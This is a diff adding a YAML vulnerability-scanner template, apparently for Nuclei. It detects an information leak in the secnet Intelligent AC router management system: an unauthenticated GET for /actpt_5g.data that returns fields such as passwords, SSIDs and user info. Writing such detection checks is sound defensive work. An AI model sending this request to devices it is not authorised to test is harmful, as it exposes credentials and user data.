@@ -1,0 +1,30 @@
+id: secnet-infoleak-actpt-5g
+info:
+  name: secnet Intelligent Router actpt_5g.data Infoleakage
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    secnet Intelligent AC management system is the wireless AP management system of Guangzhou Secure Network Communication Technology Co., LTD. The secnet intelligent AC management system has information vulnerabilities, which can be used by attackers to obtain sensitive information.
+  reference:
+    - https://afei00123.blog.csdn.net/
+  classification:
+    cvss-score: 7.5
+  tags: information-disclosure
+http:
+  - raw:
+      - |
+        GET /actpt_5g.data HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ap_info"
+          - "passwd"
+          - "ssids"
+          - "user_info"
